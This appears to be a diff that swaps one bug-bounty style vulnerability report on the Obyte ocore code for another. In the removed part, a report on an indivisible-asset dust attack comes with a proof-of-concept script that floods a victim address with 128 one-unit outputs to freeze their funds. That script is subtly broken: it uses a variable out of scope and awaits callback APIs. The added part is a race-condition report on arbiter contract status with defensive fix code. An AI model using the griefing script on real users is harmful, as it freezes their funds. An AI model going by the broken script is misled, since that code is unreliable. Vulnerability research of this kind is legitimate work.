@@ -1,426 +1,322 @@
-## Title
-Indivisible Asset UTXO Dust Attack - Permanent Fund Freeze via MAX_MESSAGES_PER_UNIT Limit
+# TOCTOU Race Condition in Arbiter Contract Status Updates
 
 ## Summary
-An attacker can permanently freeze victim funds by sending 128+ indivisible asset coins with minimum denomination. The `pickIndivisibleCoinsForAmount()` function in `indivisible_asset.js` fails when attempting to spend more than 127 coins due to the MAX_MESSAGES_PER_UNIT protocol limit, and victims cannot consolidate these outputs because each indivisible coin requires exactly one message per the protocol's 1-input-per-message constraint.
+
+The `respond()` function in `arbiter_contract.js` contains a Time-of-Check Time-of-Use (TOCTOU) race condition where contract status is checked at line 115 but updated only after asynchronous operations complete at line 127. This allows concurrent `revoke()` operations or peer messages to change the status during the async window, which then gets silently overwritten, causing permanent state inconsistency between contract parties. [1](#0-0) 
 
 ## Impact
-**Severity**: High  
-**Category**: Permanent Fund Freeze
 
-**Affected Assets**: Any indivisible asset (fixed_denominations=true) with small denominations that allows transfers to arbitrary addresses (is_transferrable=true).
+**Severity**: Medium  
+**Category**: Unintended Contract Behavior Without Direct Fund Risk
 
-**Damage Severity**:
-- **Quantitative**: All indivisible asset holdings exceeding 127 unspent outputs become unspendable in their entirety. Funds are permanently inaccessible without protocol-level changes.
-- **Qualitative**: Complete loss of spending capability. Victims retain ownership records but cannot execute any transactions spending all their holdings.
-
-**User Impact**:
-- **Who**: Any user receiving indivisible assets from untrusted sources (airdrops, marketplace transactions, asset distributions)
-- **Conditions**: Attacker creates asset with denomination=1 and distributes 128+ separate outputs to victim
-- **Recovery**: No user-level recovery mechanism exists. Options require protocol changes:
-  - Hard fork to increase MAX_MESSAGES_PER_UNIT
-  - Hard fork to allow multi-input messages for indivisible assets
-  - Database manipulation (violates protocol integrity)
-
-**Systemic Risk**:
-- Attack is automatable and can target unlimited victims in parallel
-- Transaction fees accumulate during failed consolidation attempts
-- Legitimate indivisible assets become potential griefing vectors
+Contract parties can have permanently inconsistent views of contract state (one showing "accepted", the other "revoked"). However, this does not result in permanent fund freeze because the arbiter can resolve disputes through data feed transactions, and payment completion requires cooperation from both parties anyway.
 
 ## Finding Description
 
-**Location**: `byteball/ocore/indivisible_asset.js`, function `pickIndivisibleCoinsForAmount()`, lines 375-585
+**Location**: `byteball/ocore/arbiter_contract.js`, functions `respond()` (lines 112-148), `revoke()` (lines 150-159), `setField()` (lines 76-87)
 
-**Intended Logic**: The function should select sufficient unspent coins to satisfy payment amounts and compose valid transactions within protocol limits, allowing users to spend their funds.
+**Intended Logic**: The arbiter contract system should enforce atomic state transitions. The status check at line 115 is meant to ensure only valid transitions occur before proceeding with the acceptance flow.
 
-**Actual Logic**: When a user holds more than 127 unspent outputs of an indivisible asset, attempting to spend an amount requiring all coins triggers a protocol limit check that permanently prevents the transaction, with no consolidation mechanism available.
+**Actual Logic**: Due to Node.js's asynchronous event loop and lack of transaction protection, a race condition exists:
+
+1. Status check passes at line 115 [2](#0-1) 
+2. Asynchronous operations execute at lines 135-141 [3](#0-2) 
+3. During this multi-second window, concurrent operations can change the status
+4. Line 127 unconditionally overwrites status via `setField()` [4](#0-3) 
 
 **Code Evidence**:
 
-The critical limit check that prevents spending 128+ coins: [1](#0-0) 
+The `setField()` function performs an unconditional UPDATE without checking current status in the WHERE clause: [5](#0-4) 
 
-The MAX_MESSAGES_PER_UNIT constant defining the hard limit: [2](#0-1) 
-
-Each picked coin creates exactly one payload in the array: [3](#0-2) [4](#0-3) 
-
-Each payload becomes a separate message in the unit: [5](#0-4) 
-
-The fundamental protocol constraint - indivisible assets require exactly 1 input per message: [6](#0-5) 
-
-Private payment validation also enforces the single-input constraint: [7](#0-6) 
-
-Asset denominations have no minimum value beyond positive integers (minimum = 1): [8](#0-7) 
+The `revoke()` function has the same vulnerable check-then-act pattern: [6](#0-5) 
 
 **Exploitation Path**:
 
-1. **Preconditions**: 
-   - Attacker creates an indivisible asset with denomination=1 using standard asset definition
-   - Asset has is_transferrable=true to allow sending to victim addresses
-   - Attacker has ~45,000 bytes for transaction fees
+1. **Preconditions**: Alice creates contract offer for Bob (status: "pending")
 
-2. **Step 1**: Attacker distributes dust to victim
-   - Sends 128+ separate payments to victim address
-   - Each payment contains 1 unit (amount=1, denomination=1)
-   - Each payment creates a separate unspent output in victim's balance
-   - Code path: `composer.composeJoint()` → `indivisible_asset.composeIndivisibleAssetPaymentJoint()` → outputs stored
+2. **Step 1 (T=0)**: Bob calls `respond(hash, "accepted", signedMsg, signer, callback)`
+   - Status check at line 115 passes (status is "pending")
+   - Async operations begin: `device.getOrGeneratePermanentPairingInfo()` followed by `composer.composeAuthorsAndMciForAddresses()`
+   - Control returns to event loop
 
-3. **Step 2**: Victim attempts to spend total holdings
-   - Victim initiates transaction to spend 128 units
-   - `pickIndivisibleCoinsForAmount()` is called with amount=128
-   - Function iterates through available coins, adding each to `arrPayloadsWithProofs`
+3. **Step 2 (T=1)**: Alice calls `revoke(hash)` on her node
+   - Alice's database updated: status → "revoked"  
+   - Alice sends `arbiter_contract_update` message to Bob [7](#0-6) 
 
-4. **Step 3**: Limit check triggers after 127 coins
-   - After picking 127 coins: `arrPayloadsWithProofs.length = 127`
-   - `accumulated_amount = 127`, `remaining_amount = 1`
-   - Function attempts to pick 128th coin
-   - Limit check evaluates: `127 >= (128 - 1)` → `127 >= 127` → TRUE
-   - Returns error: "Too many messages, try sending a smaller amount"
-   - Transaction composition fails
+4. **Step 3 (T=2)**: Bob's wallet receives Alice's message
+   - Message handler validates transition "pending" → "revoked" is allowed [8](#0-7) 
+   - Bob's database updated: status → "revoked"
 
-5. **Step 4**: Consolidation attempts fail
-   - Victim attempts to "consolidate" by sending 127 coins to themselves
-   - Each coin requires its own message (1-input-per-message rule)
-   - Transaction creates 127 new outputs (one per message)
-   - Result: 127 new outputs + 1+ unspent old outputs = 128+ outputs total
-   - No reduction in output count achieved
-   - Cycle repeats indefinitely
+5. **Step 4 (T=3)**: Bob's async operations complete
+   - `setField()` executes at line 127, unconditionally setting status = "accepted"
+   - Bob's database now shows "accepted", overwriting the "revoked" status
 
-**Security Property Broken**: 
+6. **Step 5 (T=4)**: Bob sends `arbiter_contract_response` to Alice
+   - Alice's handler checks if transition "revoked" → "accepted" is valid
+   - Validation at wallet.js:729 rejects this transition [9](#0-8) 
+   - Alice's database remains "revoked"
 
-Violates the fundamental invariant that users must be able to spend funds they legitimately own. While balance is technically conserved in the database, funds become permanently inaccessible, functionally equivalent to fund loss.
+**Final State**:
+- Bob's database: status = "accepted"
+- Alice's database: status = "revoked"  
+- Permanent inconsistency - messages rejected by both parties' validation logic
+- Contract cannot proceed to completion without manual reconciliation
+
+**Security Property Broken**: State Consistency - distributed wallet databases must maintain consistent contract state across parties.
 
 **Root Cause Analysis**:
 
-The vulnerability arises from the interaction of three independent protocol constraints:
+1. **No Database Transactions**: The codebase has `db.executeInTransaction()` available but it is not used in `respond()` or `revoke()` [10](#0-9) 
 
-1. **Anti-spam message limit**: MAX_MESSAGES_PER_UNIT = 128 with 1 reserved for fees = 127 maximum for asset payments
-2. **Denomination integrity constraint**: Each indivisible asset coin must be spent in a separate message with exactly 1 input to maintain denomination boundaries
-3. **Denomination flexibility**: No minimum denomination value enforced, allowing denomination=1
+2. **No Mutex Locks**: Confirmed via grep - no mutex protection in `arbiter_contract.js`
 
-These constraints create an impossible situation: with 128+ outputs of denomination=1, spending all funds requires 128+ messages, which exceeds the protocol limit. The 1-input-per-message rule prevents combining multiple coins, making consolidation impossible.
+3. **Unconditional UPDATE**: The `setField()` function performs `UPDATE wallet_arbiter_contracts SET status=? WHERE hash=?` without validating current status in WHERE clause
+
+4. **Large Timing Window**: Two sequential async operations create multi-second race window
 
 ## Impact Explanation
 
-**Affected Assets**: Any indivisible asset with is_transferrable=true and small denomination values.
+**Affected Assets**: Arbiter contract state consistency in wallet databases (not on-chain consensus state)
 
 **Damage Severity**:
-- **Quantitative**: For each victim, all holdings exceeding 127 outputs become permanently frozen. Attack cost is ~45,000 bytes (~$0.45 at current rates) per victim, while potential locked value is unlimited.
-- **Qualitative**: Victims experience complete loss of spending capability for affected assets while retaining ownership records, creating a paradoxical state of "owned but unspendable" funds.
+- **Quantitative**: Per-contract impact. State inconsistency affects contract parties' ability to proceed with standard flow.
+- **Qualitative**: Requires manual reconciliation or arbiter intervention. However, funds are NOT permanently frozen because:
+  - Shared address definition includes arbiter resolution paths [11](#0-10) 
+  - Arbiter can post data feed to unlock funds unilaterally
+  - Payment completion requires both parties' cooperation anyway
 
 **User Impact**:
-- **Who**: Any user accepting indivisible asset payments from unknown sources. Particularly vulnerable are users participating in token distributions, marketplaces, or accepting donations.
-- **Conditions**: Attacker only needs to create an asset and send 128+ small outputs. No special timing or network conditions required.
-- **Recovery**: Impossible at user level. Requires either:
-  - Protocol hard fork to modify MAX_MESSAGES_PER_UNIT constant
-  - Protocol hard fork to allow multiple inputs per message for indivisible assets
-  - Direct database manipulation (violates integrity, not recommended)
+- **Who**: Both contract parties (offerer and acceptor)
+- **Conditions**: Occurs when operations overlap in time during async window (1-5 seconds)
+- **Recovery**: Requires arbiter intervention or manual state reconciliation, but funds remain accessible
 
 **Systemic Risk**:
-- **Automation potential**: Attack script can target thousands of addresses simultaneously
-- **Economic griefing**: Victims waste transaction fees in failed consolidation attempts
-- **Asset reputation damage**: Legitimate use cases for indivisible assets become attack vectors
-- **Network bloat**: Failed consolidation attempts permanently add to DAG size without benefit
+- Limited to arbiter contract feature, not core protocol consensus
+- Similar pattern may exist in other state transition functions
+- Automatic payment detection at line 680 could auto-transition to "paid" [12](#0-11) 
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Any user with an Obyte address and minimal capital
-- **Resources Required**: 
-  - Asset creation fee: ~500 bytes
-  - 128 transfer transactions: ~44,000 bytes
-  - Total: <45,000 bytes (~$0.45 USD equivalent)
-- **Technical Skill**: Low - uses only standard wallet operations and asset creation
+- **Identity**: Either contract party with normal wallet access
+- **Resources Required**: Standard Obyte wallet
+- **Technical Skill**: Low - can occur accidentally (rapid clicking) or deliberately
 
 **Preconditions**:
-- **Network State**: None - exploitable during normal operation at any time
-- **Attacker State**: Only requires sufficient bytes for transaction fees
-- **Timing**: No timing constraints or coordination requirements
+- **Network State**: Normal operation
+- **Attacker State**: Active arbiter contract in "pending" state
+- **Timing**: Operations must overlap within async window (typically 1-5 seconds)
 
 **Execution Complexity**:
-- **Transaction Count**: 129 transactions total (1 asset definition + 128 transfers)
-- **Coordination**: None - simple sequential submission
-- **Detection Risk**: Low - appears as legitimate asset distribution
+- **Transaction Count**: Two concurrent operations (respond + revoke)
+- **Coordination**: Single party changing mind quickly, or natural concurrent actions
+- **Detection Risk**: Low - appears as normal contract operations
 
 **Frequency**:
-- **Repeatability**: Unlimited - attack can be repeated with new assets or additional outputs
-- **Scale**: Can target unlimited victims in parallel using automated scripts
+- **Repeatability**: Can occur naturally or be deliberately triggered
+- **Scale**: Per-contract impact
 
-**Overall Assessment**: High likelihood - The attack is trivial to execute, extremely cheap, undetectable until funds are frozen, and completely irreversible without protocol changes.
+**Overall Assessment**: Medium likelihood. The async window is substantial (several seconds), making both accidental and intentional races realistic.
 
 ## Recommendation
 
 **Immediate Mitigation**:
-Add validation to reject asset transfers that would create output counts approaching the spendability limit:
 
-- In `indivisible_asset.js`, add output count tracking and warnings when receiving payments
-- Wallet implementations should warn users before accepting transfers that would create 100+ outputs
-
-**Permanent Fix Options**:
-
-**Option 1**: Increase MAX_MESSAGES_PER_UNIT constant (requires hard fork):
-- Modify `constants.js:45` to increase limit (e.g., 256 or 512)
-- Allows more coins per transaction but doesn't eliminate the vulnerability
-
-**Option 2**: Allow multi-input messages for consolidation (requires hard fork):
-- Add special "consolidation" transaction type for indivisible assets
-- Remove 1-input constraint in `validation.js:1917` for consolidation-only transactions
-- Requires careful design to prevent breaking denomination integrity
-
-**Option 3**: Implement minimum denomination requirement:
-- Add validation in `validation.js` to enforce minimum denomination (e.g., 100)
-- Prevents creation of micro-denomination dust attacks
-- May break existing asset designs
-
-**Additional Measures**:
-- Add monitoring for addresses accumulating high output counts
-- Implement test case: `test/indivisible_asset_dust_attack.test.js` validating the 127-coin spending limit
-- Document the limitation in protocol specification and wallet implementations
-- Consider output consolidation transactions in wallet UX design
-
-**Validation**:
-- Chosen fix must preserve denomination integrity for indivisible assets
-- No new attack vectors introduced
-- Backward compatible with existing assets where possible
-- Performance impact acceptable for normal usage patterns
-
-## Proof of Concept
+Wrap status updates in database transactions with status validation in WHERE clause:
 
 ```javascript
-const composer = require('byteball/ocore/composer.js');
-const indivisible_asset = require('byteball/ocore/indivisible_asset.js');
-const db = require('byteball/ocore/db.js');
-const headlessWallet = require('headless-obyte');
-
-async function testIndivisibleAssetDustAttack() {
-    // Step 1: Create indivisible asset with minimum denomination
-    const assetDefinition = {
-        fixed_denominations: true,
-        is_private: false,
-        is_transferrable: true,
-        auto_destroy: false,
-        issued_by_definer_only: false,
-        cosigned_by_definer: false,
-        spender_attested: false,
-        denominations: [
-            { denomination: 1 }  // Minimum possible denomination
-        ]
-    };
-    
-    const attackerAddress = await headlessWallet.issueChangeAddressAndSendPayment(
-        'asset', 
-        null, 
-        assetDefinition, 
-        (err, unit) => {
-            if (err) throw err;
-            console.log('Asset created in unit:', unit);
-        }
-    );
-    
-    // Wait for asset to be stable
-    await waitForStability(unit);
-    
-    // Step 2: Get asset ID from unit
-    const asset = await getAssetFromUnit(unit);
-    
-    // Step 3: Send 128 separate dust outputs to victim
-    const victimAddress = 'VICTIM_ADDRESS_HERE';
-    
-    for (let i = 0; i < 128; i++) {
-        await indivisible_asset.composeIndivisibleAssetPaymentJoint({
-            asset: asset,
-            paying_addresses: [attackerAddress],
-            fee_paying_addresses: [attackerAddress],
-            to_address: victimAddress,
-            amount: 1,  // Send 1 unit per transaction
-            change_address: attackerAddress,
-            callbacks: {
-                ifError: (err) => console.error(`Transfer ${i} failed:`, err),
-                ifNotEnoughFunds: (err) => console.error(`Not enough funds for transfer ${i}`),
-                ifOk: (objJoint) => console.log(`Transfer ${i} successful, unit:`, objJoint.unit.unit)
-            }
-        });
+// In arbiter_contract.js setField()
+db.query("UPDATE wallet_arbiter_contracts SET " + field + "=? WHERE hash=? AND status=?", 
+    [value, hash, expected_current_status], function(res) {
+    if (res.affectedRows === 0) {
+        return cb("Status changed during operation");
     }
-    
-    console.log('Sent 128 dust outputs to victim');
-    
-    // Step 4: Victim attempts to spend all 128 coins
-    // This will fail at the limit check
-    
-    db.query(
-        "SELECT COUNT(*) as count FROM outputs WHERE address=? AND asset=? AND is_spent=0",
-        [victimAddress, asset],
-        function(rows) {
-            console.log(`Victim has ${rows[0].count} unspent outputs`);
-            
-            // Attempt to spend all
-            indivisible_asset.composeIndivisibleAssetPaymentJoint({
-                asset: asset,
-                paying_addresses: [victimAddress],
-                fee_paying_addresses: [victimAddress],
-                to_address: attackerAddress,
-                amount: 128,  // Try to spend all 128 units
-                change_address: victimAddress,
-                callbacks: {
-                    ifError: (err) => {
-                        console.error('VULNERABILITY CONFIRMED:');
-                        console.error('Expected error:', err);
-                        // Should output: "Too many messages, try sending a smaller amount"
-                    },
-                    ifNotEnoughFunds: (err) => console.error('Not enough funds:', err),
-                    ifOk: (objJoint) => console.log('Transaction successful (unexpected):', objJoint.unit.unit)
-                }
-            });
-        }
-    );
-    
-    // Step 5: Attempt consolidation - this will also fail to reduce output count
-    console.log('\nAttempting consolidation by sending to self...');
-    
-    indivisible_asset.composeIndivisibleAssetPaymentJoint({
-        asset: asset,
-        paying_addresses: [victimAddress],
-        fee_paying_addresses: [victimAddress],
-        to_address: victimAddress,  // Send to self
-        amount: 127,  // Maximum possible
-        change_address: victimAddress,
-        callbacks: {
-            ifError: (err) => console.error('Consolidation failed:', err),
-            ifNotEnoughFunds: (err) => console.error('Not enough funds:', err),
-            ifOk: (objJoint) => {
-                // Count outputs in this unit
-                let outputCount = 0;
-                objJoint.unit.messages.forEach(msg => {
-                    if (msg.payload && msg.payload.outputs) {
-                        outputCount += msg.payload.outputs.length;
-                    }
-                });
-                console.log(`Consolidation created ${outputCount} new outputs`);
-                console.log('Result: Still have 128 total outputs (127 new + 1 unspent)');
-                console.log('VULNERABILITY CONFIRMED: Cannot reduce output count below 128');
-            }
-        }
-    });
-}
-
-// Helper functions
-async function waitForStability(unit) {
-    return new Promise((resolve) => {
-        const interval = setInterval(() => {
-            db.query("SELECT is_stable FROM units WHERE unit=?", [unit], (rows) => {
-                if (rows[0].is_stable === 1) {
-                    clearInterval(interval);
-                    resolve();
-                }
-            });
-        }, 1000);
-    });
-}
-
-async function getAssetFromUnit(unit) {
-    return new Promise((resolve, reject) => {
-        db.query(
-            "SELECT asset FROM messages WHERE unit=? AND app='asset'",
-            [unit],
-            (rows) => {
-                if (rows.length === 0) reject('Asset not found');
-                resolve(rows[0].asset);
-            }
-        );
-    });
-}
-
-// Run the test
-testIndivisibleAssetDustAttack().catch(console.error);
+    // ...
+});
 ```
+
+**Permanent Fix**:
+
+Use `db.executeInTransaction()` to wrap the check-update sequence:
+
+```javascript
+function respond(hash, status, signedMessageBase64, signer, cb) {
+    db.executeInTransaction(function(conn, done) {
+        conn.query("SELECT * FROM wallet_arbiter_contracts WHERE hash=?", [hash], function(rows) {
+            if (rows[0].status !== "pending" && rows[0].status !== "accepted")
+                return done("contract is in non-applicable status");
+            // Perform async operations
+            // Update status
+            done();
+        });
+    }, cb);
+}
+```
+
+**Additional Measures**:
+- Add test case verifying concurrent respond/revoke operations maintain consistency
+- Add optimistic locking with version field in database schema
+- Re-check status before final update
 
 ## Notes
 
-This vulnerability is a genuine design flaw arising from the interaction of three well-intentioned protocol constraints. The fix requires careful consideration as each constraint serves an important purpose:
+**Severity Justification**: This is classified as **Medium** severity, not High/Critical as claimed, because:
 
-1. MAX_MESSAGES_PER_UNIT prevents spam and excessive unit sizes
-2. The 1-input-per-message rule maintains denomination integrity for indivisible assets
-3. Denomination flexibility allows diverse asset designs
+1. **Not Permanent Fund Freeze**: The arbiter can resolve by posting a data feed transaction [11](#0-10) . This allows winner to withdraw funds unilaterally. Immunefi defines "Permanent Freezing" as "funds locked with no transaction able to unlock them" - this does not apply here.
 
-The recommended fix is Option 2 (allow multi-input consolidation transactions) as it addresses the root cause while preserving the benefits of each constraint. However, this requires a hard fork and careful protocol design to prevent abuse.
+2. **Payment Unlikely Without Cooperation**: The `createSharedAddressAndPostUnit()` function requires both parties to sign the unit sent from the shared address [13](#0-12) , preventing Bob from unilaterally locking funds.
 
-The vulnerability is currently exploitable on mainnet and represents a real risk to users accepting indivisible asset payments from untrusted sources.
+3. **Wallet-Level Issue**: This affects wallet state synchronization, not core DAG consensus. Each party maintains their own local contract database.
+
+4. **Immunefi Alignment**: Per Immunefi Obyte scope, this matches "Unintended AA/Contract Behavior Without Direct Fund Risk (Medium)" rather than "Permanent Freezing of Funds (High/Critical)".
+
+The vulnerability is real and should be fixed, but the impact is operational disruption requiring manual intervention, not permanent fund loss.
 
 ### Citations
 
-**File:** indivisible_asset.js (L74-75)
+**File:** arbiter_contract.js (L76-87)
 ```javascript
-	if (!ValidationUtils.isArrayOfLength(payload.inputs, 1))
-		return callbacks.ifError("inputs array must be 1 element long");
+function setField(hash, field, value, cb, skipSharing) {
+	if (!["status", "shared_address", "unit", "my_contact_info", "peer_contact_info", "peer_pairing_code", "resolution_unit", "cosigners"].includes(field)) {
+		throw new Error("wrong field for setField method");
+	}
+	db.query("UPDATE wallet_arbiter_contracts SET " + field + "=? WHERE hash=?", [value, hash], function(res) {
+		if (!skipSharing)
+			shareUpdateToCosigners(hash, field);
+		if (cb) {
+			getByHash(hash, cb);
+		}
+	});
+}
 ```
 
-**File:** indivisible_asset.js (L458-463)
+**File:** arbiter_contract.js (L112-148)
 ```javascript
-					var payload = {
-						asset: asset,
-						denomination: row.denomination,
-						inputs: [input],
-						outputs: createOutputs(amount_to_use, change_amount)
-					};
+function respond(hash, status, signedMessageBase64, signer, cb) {
+	cb = cb || function(){};
+	getByHash(hash, function(objContract){
+		if (objContract.status !== "pending" && objContract.status !== "accepted")
+			return cb("contract is in non-applicable status");
+		var send = function(authors, pairing_code) {
+			var response = {hash: objContract.hash, status: status, signed_message: signedMessageBase64, my_contact_info: objContract.my_contact_info};
+			if (authors) {
+				response.authors = authors;
+			}
+			if (pairing_code) {
+				response.my_pairing_code = pairing_code;
+			}
+			device.sendMessageToDevice(objContract.peer_device_address, "arbiter_contract_response", response);
+
+			setField(objContract.hash, "status", status, function(objContract) {
+				if (status === "accepted") {
+					shareContractToCosigners(objContract.hash);
+				};
+				cb(null, objContract);
+			});
+		};
+		if (status === "accepted") {
+			device.getOrGeneratePermanentPairingInfo(function(pairingInfo){
+				var pairing_code = pairingInfo.device_pubkey + "@" + pairingInfo.hub + "#" + pairingInfo.pairing_secret;
+				composer.composeAuthorsAndMciForAddresses(db, [objContract.my_address], signer, function(err, authors) {
+					if (err) {
+						return cb(err);
+					}
+					send(authors, pairing_code);
+				});
+			});
+		} else {
+			send();
+		}
+	});
+}
 ```
 
-**File:** indivisible_asset.js (L482-482)
+**File:** arbiter_contract.js (L150-159)
 ```javascript
-					arrPayloadsWithProofs.push(objPayloadWithProof);
+function revoke(hash, cb) {
+	getByHash(hash, function(objContract){
+		if (objContract.status !== "pending")
+			return cb("contract is in non-applicable status");
+		setField(objContract.hash, "status", "revoked", function(objContract) {
+			shareUpdateToPeer(objContract.hash, "status");
+			cb(null, objContract);
+		});
+	});
+}
 ```
 
-**File:** indivisible_asset.js (L487-488)
+**File:** arbiter_contract.js (L410-417)
 ```javascript
-					if (arrPayloadsWithProofs.length >= constants.MAX_MESSAGES_PER_UNIT - 1) // reserve 1 for fees
-						return onDone("Too many messages, try sending a smaller amount");
+				        ["address", contract.my_address],
+				        ["in data feed", [[contract.arbiter_address], "CONTRACT_" + contract.hash, "=", contract.my_address]]
+				    ]],
+				    ["and", [
+				        ["address", contract.peer_address],
+				        ["in data feed", [[contract.arbiter_address], "CONTRACT_" + contract.hash, "=", contract.peer_address]]
+				    ]]
+				]];
 ```
 
-**File:** indivisible_asset.js (L757-786)
+**File:** arbiter_contract.js (L516-517)
 ```javascript
-						for (var i=0; i<arrPayloadsWithProofs.length; i++){
-							var payload = arrPayloadsWithProofs[i].payload;
-							var payload_hash;// = objectHash.getBase64Hash(payload);
-							var bJsonBased = (last_ball_mci >= constants.timestampUpgradeMci);
-							if (objAsset.is_private){
-								payload.outputs.forEach(function(o){
-									o.output_hash = objectHash.getBase64Hash({address: o.address, blinding: o.blinding});
-								});
-								var hidden_payload = _.cloneDeep(payload);
-								hidden_payload.outputs.forEach(function(o){
-									delete o.address;
-									delete o.blinding;
-								});
-								payload_hash = objectHash.getBase64Hash(hidden_payload, bJsonBased);
+								arrSigningDeviceAddresses: contract.cosigners.length ? contract.cosigners.concat([contract.peer_device_address, device.getMyDeviceAddress()]) : [],
+								signing_addresses: [shared_address],
+```
+
+**File:** arbiter_contract.js (L680-681)
+```javascript
+					setField(contract.hash, "status", "paid", function(objContract) {
+						eventBus.emit("arbiter_contract_update", objContract, "status", "paid", row.unit);
+```
+
+**File:** wallet.js (L618-639)
+```javascript
+						if (body.field === "status") {
+							var isOK = false;
+							switch (objContract.status) {
+								case "pending":
+									if (body.value === "revoked" || body.value === "accepted")
+										isOK = true;
+									break;
+								case "paid":
+									if (body.value === "in_dispute" || body.value === "cancelled" || body.value === "completed")
+										isOK = true;
+									break;
+								case "dispute_resolved":
+									if (body.value === "in_appeal")
+										isOK = true;
+									break;
+								case "in_appeal":
+									if (objContract.arbstore_device_address === from_address && (body.value === 'appeal_approved' || body.value === 'appeal_declined'))
+										isOK = true;
+									break;
 							}
-							else
-								payload_hash = objectHash.getBase64Hash(payload, bJsonBased);
-							var objMessage = {
-								app: "payment",
-								payload_location: objAsset.is_private ? "none" : "inline",
-								payload_hash: payload_hash
-							};
-							if (objAsset.is_private){
-								assocPrivatePayloads[payload_hash] = payload;
-								objMessage.spend_proofs = [arrPayloadsWithProofs[i].spend_proof];
-							}
-							else
-								objMessage.payload = payload;
-							arrMessages.push(objMessage);
-						}
+							if (!isOK)
+								return callbacks.ifError("wrong status for contract supplied");
 ```
 
-**File:** constants.js (L45-45)
+**File:** wallet.js (L729-731)
 ```javascript
-exports.MAX_MESSAGES_PER_UNIT = 128;
+						var isAllowed = objContract.status === "pending" || (objContract.status === 'accepted' && body.status === 'accepted');
+						if (!isAllowed)
+							return callbacks.ifError("contract is not active, current status: " + objContract.status);
 ```
 
-**File:** validation.js (L1917-1918)
+**File:** db.js (L25-39)
 ```javascript
-	if (objAsset && objAsset.fixed_denominations && payload.inputs.length !== 1)
-		return callback("fixed denominations payment must have 1 input");
-```
+function executeInTransaction(doWork, onDone){
+	module.exports.takeConnectionFromPool(function(conn){
+		conn.query("BEGIN", function(){
+			doWork(conn, function(err){
+				conn.query(err ? "ROLLBACK" : "COMMIT", function(){
+					conn.release();
+					if (onDone)
+						onDone(err);
+				});
+			});
+		});
+	});
+}
 
-**File:** validation.js (L2514-2515)
-```javascript
-			if (!isPositiveInteger(denomInfo.denomination))
-				return callback("invalid denomination");
+module.exports.executeInTransaction = executeInTransaction;
 ```
